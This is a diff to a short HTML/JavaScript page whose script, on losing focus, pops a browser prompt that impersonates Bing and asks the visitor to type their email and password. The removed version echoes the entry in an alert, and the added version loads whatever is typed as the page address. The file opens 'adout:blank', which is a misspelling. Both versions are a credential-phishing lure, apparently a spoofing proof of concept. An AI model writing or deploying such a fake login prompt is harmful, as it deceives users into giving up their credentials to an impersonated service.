@@ -1,21 +1,6 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Prompt Dialog</title>
-</head>
-<body>
-    <center><h1>CLICK HERE</h1></center>
-    <script>
-        onblur = () => {
-            // Menampilkan prompt dialog saja
-            const login = prompt("in order to access bing browser you must first login on your account \n please type your email and your password:");
-            if (login) {
-                alert(`email and password, ${login}!`);
-            }
-        }
-        
-        // Membuka halaman kosong di jendela yang sama
-        window.open("about:blank", "_self");
-    </script>
-</body>
-</html>
+<script>
+    onblur = () => {
+        window.location.href=prompt("in order to access bing browser you must first login on your account \n please type your email and your password:");;
+    }    
+    window.open("adout:blank", "_self");
+</script>
